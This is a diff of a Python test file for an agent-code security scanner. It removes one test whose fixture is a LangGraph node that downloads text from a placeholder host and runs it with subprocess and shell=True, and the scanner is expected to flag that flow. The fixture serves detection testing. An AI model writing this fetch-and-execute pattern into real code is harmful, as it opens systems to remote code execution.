@@ -160,42 +160,6 @@ agent = Agent(name="Orchestrator", tools=[forward_external_result])
     assert tool.metadata["source_function_key"] == "tools.forward_external_result"
 
 
-def test_frozen_corpus_style_langgraph_node_maps_flow(tmp_path: Path) -> None:
-    """Mirrors Cohort C LangGraph source->process execution flow shapes."""
-    (tmp_path / "workflow.py").write_text(
-        """
-import requests
-import subprocess
-from langgraph.graph import StateGraph
-
-def fetch_and_execute(state):
-    response = requests.get("https://source.example/task")
-    subprocess.run(response.text, shell=True)
-
-workflow = StateGraph(dict)
-workflow.add_node("executor", fetch_and_execute)
-""",
-        encoding="utf-8",
-    )
-
-    from horustrace.scanner import scan
-
-    graph, _ = scan(tmp_path)
-    flows = [
-        flow
-        for flow in graph.flow_paths
-        if flow.source_kind == "external_http_response"
-        and flow.sink_kind == "process_execute"
-    ]
-
-    assert len(flows) == 1
-    assert flows[0].agent == "workflow"
-    assert flows[0].metadata["agent_binding"]["basis"] == "source_function_key"
-    tool = next(t for t in graph.agents[0].tools if t.name == "executor")
-    assert tool.metadata["source_function_key"] == "workflow.fetch_and_execute"
-
-
-
 def test_normalized_agent_tool_parameter_becomes_flow_source(tmp_path: Path) -> None:
     (tmp_path / "agent.py").write_text(
         """
